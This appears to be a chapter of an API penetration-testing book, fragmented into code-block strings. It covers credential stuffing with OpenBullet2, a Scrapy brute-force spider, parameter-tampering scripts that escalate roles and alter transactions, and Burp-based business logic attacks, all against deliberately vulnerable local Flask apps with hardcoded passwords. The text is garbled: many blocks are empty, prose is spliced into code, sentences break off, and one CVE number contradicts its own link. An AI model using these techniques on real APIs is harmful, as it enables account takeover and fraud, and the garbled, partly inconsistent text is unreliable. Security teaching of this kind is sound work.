["```\nfrom flask import Flask, request, jsonify\nfrom datetime import datetime, timedelta\nfrom collections import defaultdict\nimport time\napp = Flask(__name__)\nusers = {\n    \"user1\": \"password123\",\n    \"user2\": \"password456\",\n}\nlogin_attempts = defaultdict(list)\ndef is_rate_limited(user):\n    now = datetime.now()\n    window_start = now - timedelta(minutes=1)\n    attempts = [ts for ts in login_attempts[user] if ts > window_start]\n    login_attempts[user] = attempts\n    return len(attempts) >= 5\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.get_json()\n    username = data.get('username')\n    password = data.get('password')\n    if is_rate_limited(username):\n        return jsonify({\"message\": \"Rate limit! Try again later.\"}), 429\n    if users.get(username) == password:\n        login_attempts[username].clear()\n        return jsonify({\"message\": \"Login successful\"}), 200\n    else:\n        login_attempts[username].append(datetime.now())\n        return jsonify({\"message\": \"Invalid credentials\"}), 401\nif __name__ == '__main__':\n    app.run(debug=True)\n```", "```\n$ docker network list\nNETWORK ID     NAME      DRIVER    SCOPE\nd8dd035a66bd   bridge    bridge    local\n19ba2bd53bfd   host      host      local\n821848b3ff50   none      null      local\n```", "```\nFROM python:3.9-slim-buster\nWORKDIR /app\nCOPY ./requirements.txt /app\nRUN pip install -r requirements.txt\nCOPY . .\nEXPOSE 5000\nENV FLASK_APP=api_credential.py\nCMD [\"flask\", \"run\", \"--host\", \"0.0.0.0\"]\n```", "```\n$ docker build -t api .\n$ docker run -p 5000:5000 --name credential_api api\n```", "```\n$ docker run --name openbullet2 --rm -p 8069:5000 \\\n-v ./UserData/:/app/UserData/ \\\n-it openbullet/openbullet2:latest\n```", "```\n[WORDLIST TYPE]\nName=Default\nRegex=^.*$\nVerify=False\nSeparator=:\nSlices=USERNAME,PASSWORD\n```", "```\n    $ ifconfig docker0\n    docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n    inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255\n    inet6 fe80::42:a2ff:fe20:673e  prefixlen 64  scopeid 0x20<link>\n    ether 02:42:a2:20:67:3e  txqueuelen 0  (Ethernet)\n    RX packets 0  bytes 0 (0.0 B)\n    RX errors 0  dropped 0  overruns 0  frame 0\n    TX packets 36  bytes 4857 (4.8 KB)\n    172.17.0.1. Containers will be allocated the subsequent addresses in the order in which they come up. I will presume that the API has 172.17.0.2, as it was the first container to be started. Let’s confirm that:\n\n    ```", "```\n\n    ```", "```\n    {\"username\": \"<input.USERNAME>\", \"password\": \"<input.PASSWORD>\"}\n    ```", "```\n    userABC:mypassword\n    userDEF:du0CJB8Q\n    user1:password123\n    simple_user:EN3SZAbR\n    user2:password456\n    ```", "```\nfrom flask import Flask, request, jsonify\nfrom flask_graphql import GraphQLView\nimport graphene\nfrom flask_jwt_extended import JWTManager, create_access_token, jwt_required\napp = Flask(__name__)\napp.config['JWT_SECRET_KEY'] = 'Token_Secret_Key'\njwt = JWTManager(app)\nclass User(graphene.ObjectType):\n    id = graphene.ID()\n    name = graphene.String()\n    email = graphene.String()\nclass Query(graphene.ObjectType):\n    users = graphene.List(User)\n    @jwt_required()\n    def resolve_users(self, info):\n        return [\n            User(id=1, name=\"Alice\", email=\"alice@example.com\"),\n            User(id=2, name=\"Bob\", email=\"bob@example.com\"),\n            User(id=3, name=\"Charlie\", email=\"charlie@example.com\"),\n        ]\nclass Mutation(graphene.ObjectType):\n    login = graphene.Field(graphene.String, username=graphene.String(),\n            password=graphene.String())\n    def resolve_login(self, info, username, password):\n        if username == \"admin\" and password == \"password\":\n            return create_access_token(identity=username)\n        return None\nschema = graphene.Schema(query=Query, mutation=Mutation)\napp.add_url_rule(\n    '/graphql',\n    view_func=GraphQLView.as_view(\n        'graphql',\n        schema=schema,\n        graphiql=True,\n    )\n)\nif __name__ == '__main__':\n    app.run(debug=True)\n```", "```\n$ pip install Flask Flask-GraphQL graphene Flask-JWT-Extended\n```", "```\n$ scrapy startproject graphqlscraper\n$ cd graphqlscraper\n```", "```\n$ scrapy startproject graphqlscraper\n```", "```\n$ ls -lRhap\n.:\ntotal 16K\ndrwxrwxr-x 3 mauricio mauricio 4.0K May 22 22:22 ./\ndrwxrwxr-x 3 mauricio mauricio 4.0K May 22 22:29 ../\ndrwxrwxr-x 4 mauricio mauricio 4.0K May 22 22:24 graphqlscraper/\n-rw-rw-r-- 1 mauricio mauricio  271 May 22 22:22 scrapy.cfg\n./graphqlscraper:\ntotal 32K\ndrwxrwxr-x 4 mauricio mauricio 4.0K May 22 22:24 ./\ndrwxrwxr-x 3 mauricio mauricio 4.0K May 22 22:22 ../\n-rw-rw-r-- 1 mauricio mauricio    0 May 22 22:19 __init__.py\n-rw-rw-r-- 1 mauricio mauricio  270 May 22 22:22 items.py\n-rw-rw-r-- 1 mauricio mauricio 3.6K May 22 22:22 middlewares.py\n-rw-rw-r-- 1 mauricio mauricio  368 May 22 22:22 pipelines.py\n-rw-rw-r-- 1 mauricio mauricio 3.3K May 22 22:22 settings.py\ndrwxrwxr-x 3 mauricio mauricio 4.0K May 22 22:35 spiders/\n./graphqlscraper/spiders:\ntotal 28K\ndrwxrwxr-x 3 mauricio mauricio 4.0K May 22 22:35 ./\ndrwxrwxr-x 4 mauricio mauricio 4.0K May 22 22:24 ../\n-rw-rw-r-- 1 mauricio mauricio 2.1K May 22 22:35 bruteforce_spider.py\n-rw-rw-r-- 1 mauricio mauricio  161 May 22 22:19 __init__.py\n```", "```\n$ scrapy crawl bruteforce_spider -o users.json\n```", "```\n$ scrapy crawl bruteforce_spider -o users.json\n2024-05-22 22:36:05 [scrapy.utils.log] INFO: Scrapy 2.11.2 started (bot: graphqlscraper)\n2024-05-22 22:36:05 [scrapy.utils.log] INFO: Versions: lxml 5.2.2.0, libxml2 2.12.6, cssselect 1.2.0, parsel 1.9.1, w3lib 2.1.2, Twisted 24.3.0, Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0], pyOpenSSL 24.1.0 (OpenSSL 3.2.1 30 Jan 2024), cryptography 42.0.7, Platform Linux-5.15.0-107-generic-aarch64-with-glibc2.35\n2024-05-22 22:36:05 [asyncio] DEBUG: Using selector: EpollSelector\n2024-05-22 22:36:05 [scrapy.utils.log] DEBUG: Using reactor: twisted.internet.asyncioreactor.AsyncioSelectorReactor\n…Output omitted for brevity…\n2024-05-22 22:36:05 [scrapy.utils.log] DEBUG: Using asyncio event loop:\n{'ID': '1', 'Name': 'Alice', 'Email': 'alice@example.com'}\n2024-05-22 22:36:05 [scrapy.core.scraper] DEBUG: Scraped from <200 http://127.0.0.1:5000/graphql>\n{'ID': '2', 'Name': 'Bob', 'Email': 'bob@example.com'}\n2024-05-22 22:36:05 [scrapy.core.scraper] DEBUG: Scraped from <200 http://127.0.0.1:5000/graphql>\n{'ID': '3', 'Name': 'Charlie', 'Email': 'charlie@example.com'}\n2024-05-22 22:36:05 [scrapy.core.engine] INFO: Closing spider (finished)\n2024-05-22 22:36:05 [scrapy.extensions.feedexport] INFO: Stored json feed (3 items) in: users.json\n2024-05-22 22:36:05 [scrapy.statscollectors] INFO: Dumping Scrapy stats:\nINFO: Stored json feed (3 items) in: users.json. Now check this file:\n\n```", "```\n\n\t\t\tThat’s it. Mission accomplished. Scrapy is a very powerful framework with lots of new features. You should definitely invest some time into looking at its documentation. I shared the official website in the *Further reading* section. Next, we will learn what **parameter tampering** is about.\n\t\t\tParameter tampering\n\t\t\tThis technique consists of deliberately manipulating the parameters exchanged between the client and server with the intent to alter the application’s behavior. The final objective could be to gain unauthorized data access, escalate privileges, or cause damage to data (such as temporary or permanent corruption). The core of the attack lies in exploiting the trust the API endpoint has in the parameters provided as part of the requests. A dangerous approach is putting too much trust on the client-side security controls. When running as JavaScript code or hidden form fields, for example, our API endpoints will likely be vulnerable to this threat.\n\t\t\tAny acceptable parameter, such as query parameters (including GraphQL), form fields, cookies, headers, and JSON structures, can be used to perpetrate this type of attack. A simple scenario could involve changing the user ID on a request header trying to access another user’s data or changing an exam grade on a school’s student system. Without proper validation, any supplied parameter, including the ones that are incorrectly formatted, could be an attack vector toward the API endpoint. APIs that are vulnerable to business logic attacks are also particularly vulnerable to this type of threat.\n\t\t\tThis sort of pentesting usually involves a few steps. You need to do some reconnaissance in the sense of identifying which methods, verbs, and parameters are accepted by the API endpoints (supposing that they are not explicitly documented). Tools such as **Burp Suite**, **OWASP ZAP**, and **Postman** will be some of your best friends. You can still achieve reasonable results with Python code or some shell scripting. This comparison is not strictly appropriate, but we can establish a quick analogy with the work we’ve done tampering JWTs in [*Chapter 4*](B19657_04.xhtml#_idTextAnchor056), *Authentication and Authorization Testing*. We analyzed which types of tokens were being handled by the API target and changed them in an attempt to deceive the backend.\n\t\t\tIn 2021, Microsoft released several vulnerabilities affecting its mail product (Exchange). They were consolidated under the **CVE-2021-26855**. They consisted of implementing **Server-Side Request Forgery** (**SSRF**) attacks by tampering with some parameters before sending them to the HTTP/HTTPS listening endpoints. The vulnerability led to **Remote Code Execution** (**RCE**) on the affected Exchange servers.\n\t\t\tYet in 2021, **Ghost CMS**, an open source publishing platform, was affected by a parameter tampering vulnerability. Identified as **CVE 2021-201315**, this vulnerability allowed **crackers** to change some query parameters, which resulted in authentication and authorization bypassing. In the end, criminals were able to access the admin interface, which created possibilities for inserting any type of malicious code.\n\t\t\tWe will use the `api_tampering.py` file as the target. As usual, you need to install Flask. The code can be found at [https://github.com/PacktPublishing/Pentesting-APIs/blob/main/chapters/chapter09/parameter_tampering/api_tampering.py](https://github.com/PacktPublishing/Pentesting-APIs/blob/main/chapters/chapter09/parameter_tampering/api_tampering.py):\n\n\t\t\t\t1.  Put the API to run. As usual, it’s listening on port 5000\\. We’ll carry out three different attacks. First, let’s try to escalate privileges by changing a user role. The `/user` endpoint gives us user data:\n\n    ```", "```\n    import requests\n    data = {\n        'user_id': '1',\n        'role': 'admin',\n        'auth': 'admin_secret'\n    }\n    response = requests.post('http://localhost:5000/api/admin/change_role', data=data)\n    print(response.json())\n    ```", "```\n\n    \t\t\t\t2.  This results in the following:\n\n    ```", "```\n\n    \t\t\t\t3.  Confirm that the tampering actually worked:\n\n    ```", "```\n    $ curl http://localhost:5000/api/transaction/1\n    {\n      \"id\": 1,\n      \"user_id\": 1,\n      \"amount\": 100,\n      \"status\": \"pending\"\n    pending. Let’s cause data corruption by forcing the transaction to complete and by leveraging the *top secret* password with another simple Python code (this code can be downloaded from https://github.com/PacktPublishing/Pentesting-APIs/blob/main/chapters/chapter09/parameter_tampering/manipulate_transaction_status.py):\n\n    ```", "```\n\n    Guess what, the transaction is now finished.\n\n    ```", "```\n\n    ```", "```\n\n    \t\t\t\t4.  Let’s double-check it:\n\n    ```", "```\n    $ curl http://localhost:5000/api/admin/update_status\n    {\n      \"error\": \"Unauthorized\"\n    }\n    ```", "```\n\n    \t\t\t\t5.  OK, that was expected. However, should we obtain such a password in some way, such as through social engineering, resource exhaustion, or data leaks, we could easily retrieve and manipulate data without proper authorization (this code can be downloaded from [https://github.com/PacktPublishing/Pentesting-APIs/blob/main/chapters/chapter09/parameter_tampering/manipulate_authorization.py](https://github.com/PacktPublishing/Pentesting-APIs/blob/main/chapters/chapter09/parameter_tampering/manipulate_authorization.py)):\n\n    ```", "```\n\n    \t\t\t\t6.  This would give us the confirmation of unauthorized access:\n\n    ```", "```\n\n\t\t\tResults with parameter tampering attacks can be as easy to achieve as the implementation of the API that’s the target. You might need to combine techniques depending on the scenario, but it’s not difficult to detect whether the API is vulnerable to this category of threat. For the people responsible for watching and protecting the environment, it can be difficult to detect when such type of attack is running, as it may be confused with a user trying to communicate with the API but messing up with some parameters because of a lack of knowledge about the documentation. In the next section, we are going to cover how we can test for business logic vulnerabilities.\n\t\t\tTesting for business logic vulnerabilities\n\t\t\tUnraveling vulnerabilities within an API’s business logic is a challenging but crucial aspect of security evaluations. Contrary to what we do with common flaws derived from coding errors or infrastructure misconfigurations, these types of vulnerabilities target the API’s designed and intended functionalities. To identify these chinks in the armor, security testers must possess a comprehensive understanding of the application’s business processes and how they might be contorted. This in-depth examination involves meticulously analyzing the application’s workflows, user permissions, and data flow to unearth potential weaknesses.\n\t\t\tDiscovering business logic vulnerabilities within APIs is not straightforward since they can easily bypass traditional security watchdogs. Automated tools might miss these hidden weaknesses since they don’t necessarily involve strange inputs or well-known exploit patterns.  Instead, these vulnerabilities stem from how the application handles legitimate operations. For example, an attacker could leverage the way an API manages transactions, user permissions, or data processing tasks to their advantage. Uncovering these flaws demands a sophisticated grasp of the application’s internal logic and a sharp eye for potential misuses that could be manipulated for malicious purposes.\n\t\t\tUnveiling business logic vulnerabilities hinges on manual testing. Security specialists need to delve into the application’s functionalities by hand, brainstorming how various features intertwine and how they might be misused for malicious ends. This hands-on approach often involves crafting intricate test scenarios that explore diverse situations.  Testers might try running actions in an unorthodox order or feeding the application with unexpected data values.  By carefully sifting through the application’s workflows, testers can pinpoint subtle cracks in the system’s logic that could be exploited to execute unauthorized actions or access sensitive data.\n\t\t\tIn 2022, a business logic vulnerability in PayPal’s API, tied to how it interprets transaction details, allowed attackers to tamper with money transfers. The vulnerability stemmed from flaws in how the system verified transaction parameters. By exploiting these gaps, attackers could manipulate the amounts being sent, resulting in financial losses. This incident highlighted the vital importance of fortifying all transaction-related checks within the system to safeguard the integrity of financial operations. You will find a detailed explanation at [https://phoenixnap.com/blog/paypal-hacked](https://phoenixnap.com/blog/paypal-hacked).\n\t\t\tYou don’t need to apply graphical tools. Code written in Python or even in Bash with the help of curl may successfully exploit business logic vulnerabilities in badly written APIs. However, should you choose the graphical path, some already-known friends such as Burp Suite and Postman are handy. Spotlighting weaknesses within an application’s business logic requires a multi-pronged approach.  One powerful technique involves a deep dive into the application’s source code, if available. This grants testers a clear picture of how various components interact, potentially revealing flaws in the application’s decision-making processes. Automated code analysis tools can accelerate this process by highlighting areas where the business logic might be implemented incorrectly, or where security controls are lacking. However, these code audits shouldn’t be the sole focus. Real-world testing (dynamic testing) is crucial to understanding how the application behaves in a live environment and how different inputs affect its internal state. Combining these methods provides a more holistic view of potential vulnerabilities.\n\t\t\tFor our exercises in this section, we’ll apply the `api_business_logic.py` file. It can be found at [https://github.com/PacktPublishing/Pentesting-APIs/blob/main/chapters/chapter09/business_logic/api_business_logic.py](https://github.com/PacktPublishing/Pentesting-APIs/blob/main/chapters/chapter09/business_logic/api_business_logic.py).\n\t\t\tWe can list at least three weaknesses:\n\n\t\t\t\t*   Right in the beginning, we have a `users` variable raises this vulnerability. Instead of specifying this in the code, we should leverage environment variables or retrieve it from an external database service, either SQL or NoSQL.\n\t\t\t\t*   Incorrect input validation is present in the `/admin` endpoint. Rather than relying on what the user provides as input, the code should leverage the language’s features, such as safe functions or methods to retrieve data.\n\t\t\t\t*   Finally, *passwords should never be stored in clear text*. Before storing them, passwords should always be stored as hashes, and safe functions or modules should be used to apply the hashes.\n\n\t\t\tThere are some useful utilities that you can make use of to help you spot code flaws:\n\n\t\t\t\t*   **Bandit**: Python security analysis tool ([https://pypi.org/project/bandit/](https://pypi.org/project/bandit/)).\n\t\t\t\t*   **Safety**: Dependency vulnerability detection utility ([https://pypi.org/project/safety/](https://pypi.org/project/safety/)).\n\t\t\t\t*   **Semgrep**: Flexible code analysis tool ([https://pypi.org/project/semgrep/](https://pypi.org/project/semgrep/)).\n\n\t\t\tNote\n\t\t\tSafety is backed by a company nowadays ([https://safetycli.com/](https://safetycli.com/)). Although claiming to be free software, to effectively run, it needs you to create an account with this company, which involves agreeing to their service terms and sharing an email address. The first time you run the utility, you’ll receive a message like the following:\n\n```", "```\n\n\t\t\tAfter the registration is complete, the next time you use the software, you’ll need to log in, and then all will be good. The utility downloads the requested (or default) rules from the internet before each run.\n\t\t\tLet’s start the attacks against the API. The steps are provided in the following sequence:\n\n\t\t\t\t1.  The first thing we’ll do is to register a new user. This code does not check any authorization in this step. We’ll use Burp Suite for these exercises. Hence, run Burp Suite and click on the **Proxy** tab. Make sure that this service is on and that **Intercept** is *active*. We’ll need it to be active to change the request type and add more parameters. Finally, click on the **Open** **browser** button.\n\t\t\t\t2.  With Burp’s browser opened (usually, a Chromium instance), access `http://localhost:5000/register`. Immediately go back to Burp and click on the `POST` instead of `GET`. Then, we need to specify the `Content-Type` to be `application/json`, as expected. Then, we must add the JSON structure for a new user. You can put anything here since it’s a valid JSON element with `username` and `password` as keys (*Figure 9**.14*).\n\n\t\t\t![Figure 9.14﻿ – Changing a GET request to POST on Burp’s Intercept](img/B19657_figure_09.14.jpg)\n\n\t\t\tFigure 9.14 – Changing a GET request to POST on Burp’s Intercept\n\n\t\t\t\t1.  Now click on the **Forward** button. This will send the crafted request to the API and the user will be registered. Back in the browser window, you’ll receive a message stating that the operation was successful (*Figure 9**.15*).\n\n\t\t\t![Figure 9.15 – A successful user registration attack](img/B19657_figure_09.15.jpg)\n\n\t\t\tFigure 9.15 – A successful user registration attack\n\n\t\t\t\t1.  Moving on, let’s explore the `/order` endpoint. By analyzing the code, we can find out that it expects to receive a username (this just needs to be a valid one), a product ID (we can infer `1` as being valid), a quantity, and a discount code. We’ll send an arbitrary discount code by crafting a combination of possible values trying to cause the logic to fail. Go back to Burp’s browser and send a request to `/order`, then get back to Burp’s **Intercept**. Again, adapt the request accordingly, making equivalent changes to the ones you made before. This time though, the JSON structure will be more sophisticated since we need to send more keys (*Figure 9**.16*).\n\n\t\t\t![Figure 9.16 – Sending a crafted POST request to /order](img/B19657_figure_09.16.jpg)\n\n\t\t\tFigure 9.16 – Sending a crafted POST request to /order\n\n\t\t\t\t1.  Again, click on the **Forward** button and go back to the browser. You’ll realize that the order was successfully submitted. However, the discount code was not applied, demonstrating that this logic doesn’t seem vulnerable to our attempts (*Figure 9**.17*).\n\n\t\t\t![Figure 9.17 – Submitting an order using the previously created user](img/B19657_figure_09.17.jpg)\n\n\t\t\tFigure 9.17 – Submitting an order using the previously created user\n\n\t\t\t\t1.  Our final exercise will lie in the `/admin` endpoint. Since absolutely no other security control besides the credential pair checking is in place, we’ll add a 100% discount code using the hardcoded credentials (they could have been stolen by a parallel method, such as social engineering or invalid exception handling). Go to the browser one more time and submit a dummy request to `/admin`, then get back to Burp’s **Intercept** and change it to the following (*Figure 9**.18*).\n\n\t\t\t![Figure 9.18 – Adding an arbitrary discount code using a stolen admin credential](img/B19657_figure_09.18.jpg)\n\n\t\t\tFigure 9.18 – Adding an arbitrary discount code using a stolen admin credential\n\t\t\tAs expected, the discount code was correctly added to the application (*Figure 9**.19*).\n\t\t\t![Figure 9.19 – The discount code is applied](img/B19657_figure_09.19.jpg)\n\n\t\t\tFigure 9.19 – The discount code is applied\n\n\t\t\t\t1.  Now, if we repeat the request to `/order` expressed in *Figure 9**.16* but change the `discount_code` to `CRAFTED_CODE` and reduce the quantity to `1` (to avoid receiving the **Insufficient stock** message), we’ll be successful (*Figure 9**.20*).\n\n\t\t\t![Figure 9.20 – The order is successfully submitted with a crafted discount code](img/B19657_figure_09.20.jpg)\n\n\t\t\tFigure 9.20 – The order is successfully submitted with a crafted discount code\n\t\t\tIn this section, you’ll realize how reasonably small and easy code can cause substantial damage to real API targets. Your toolbelt doesn’t have to be expensive or complex to help achieve success with your pentesting activities. Just a few open source utilities can be quite handy.\n\t\t\tSummary\n\t\t\tThis chapter finished the fourth part of our book, covering important aspects of API business logic and abuse scenarios. We learned how damaging the lack of source code analysis and API business logic testing can be for APIs. Some notable incidents involving threats of this nature were also mentioned.\n\t\t\tWhile some security teams are only worried about the traditional or more common threats and security measures, criminals may be trying to leverage other non-obvious attack scenarios, such as the ones we mentioned in the chapter, making use of techniques that exploit flaws in APIs’ business logic. We learned this in this chapter. It’s definitely a topic you should add to your toolbelt when conducting a professional pentest.\n\t\t\tIn the next chapter, the final one of this book, we’ll discuss secure API coding practices. These are more geared toward developers, but every pentester should know about them as well.\n\t\t\tFurther reading\n\n\t\t\t\t*   Experian’s API vulnerability: [https://salt.security/blog/what-happened-in-the-experian-api-leak](https://salt.security/blog/what-happened-in-the-experian-api-leak)\n\t\t\t\t*   John Deere’s API Leak: [https://sick.codes/leaky-john-deere-apis-serious-food-supply-chain-vulnerabilities-discovered-by-sick-codes-kevin-kenney-willie-cade/](https://sick.codes/leaky-john-deere-apis-serious-food-supply-chain-vulnerabilities-discovered-by-sick-codes-kevin-kenney-willie-cade/)\n\t\t\t\t*   The Twitter/X API breach that damaged 5.4 million users: [https://www.bbc.com/news/technology-64153381](https://www.bbc.com/news/technology-64153381)\n\t\t\t\t*   Flexbooker’s cloud API vulnerability that exposed the data of 3.7 million users: [https://www.imperva.com/blog/five-takeaways-from-flexbookers-data-breach/](https://www.imperva.com/blog/five-takeaways-from-flexbookers-data-breach/ )\n\t\t\t\t*   The Texas Department of Insurance’s API incident, exposed for nearly 3 years, which compromised 1.8 million records: [https://www.texastribune.org/2022/05/16/texas-insurance-data-breach/](https://www.texastribune.org/2022/05/16/texas-insurance-data-breach/)\n\t\t\t\t*   OpenBullet2, a web testing tool: [https://github.com/openbullet/OpenBullet2](https://github.com/openbullet/OpenBullet2 )\n\t\t\t\t*   Scrapy, a data extraction framework: [https://scrapy.org/](https://scrapy.org/)\n\t\t\t\t*   Microsoft Exchange Parameter Tampering CVE: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855)\n\t\t\t\t*   Microsoft Official Blog Post: [https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\n\t\t\t\t*   CVE 2021-201315: [https://nvd.nist.gov/vuln/detail/CVE-2021-21315](https://nvd.nist.gov/vuln/detail/CVE-2021-21315)\n\n```"]